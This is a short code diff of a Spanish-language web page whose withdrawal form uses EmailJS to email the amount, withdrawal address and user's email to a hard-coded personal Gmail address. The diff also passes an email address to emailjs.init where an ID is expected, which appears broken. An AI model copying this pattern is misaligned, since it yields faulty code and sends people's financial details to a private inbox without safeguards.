@@ -128,7 +128,7 @@
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
         (function() {
-            emailjs.init('service_b244er4'); // Inicializar EmailJS con tu User ID
+            emailjs.init('magneginvip@gmail.com'); // Reemplaza con tu User ID de EmailJS
         })();
     </script>
 </head>
@@ -177,7 +177,7 @@
             event.preventDefault();
             const amount = parseFloat(document.getElementById('amount').value);
             const withdrawAddress = document.getElementById('withdraw-address').value;
-            const email = document.getElementById('email').value;
+            const userEmail = document.getElementById('email').value;
 
             if (amount > balance) {
                 messageDiv.textContent = 'Saldo insuficiente para realizar el retiro.';
@@ -195,7 +195,7 @@
                     to_email: 'magneginvip@gmail.com',
                     amount: amount,
                     withdraw_address: withdrawAddress,
-                    user_email: email
+                    user_email: userEmail
                 }).then(function(response) {
                     console.log('Correo enviado:', response.status, response.text);
                 }, function(error) {
